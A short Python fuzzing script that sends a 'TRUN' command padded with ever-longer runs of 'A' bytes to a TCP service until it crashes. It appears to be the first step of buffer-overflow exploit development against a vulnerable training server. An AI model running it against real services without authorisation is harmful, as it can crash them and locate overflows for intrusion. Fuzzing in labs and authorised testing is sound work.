import socket


def fuzz(host, port):
    buffersize = 100

    try:
        while True:
            buffer = b"".join([
                b"TRUN",
                b" ",
                b"/.:/",
                b"A" * buffersize
            ])

            sock = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
            sock.settimeout(3)

            sock.connect((host, port))

            sock.send(buffer)
            print(
                "Transmitting {} bytes: {}".format(buffersize, buffer)
            )

            sock.recv(1024)
            sock.close()
            buffersize += 200

    except socket.error:
        if buffersize == 0:
            print("Couldn't connect to socket")

        else:
            print(
                "Socket reached end of life around {} bytes".format(buffersize)
            )
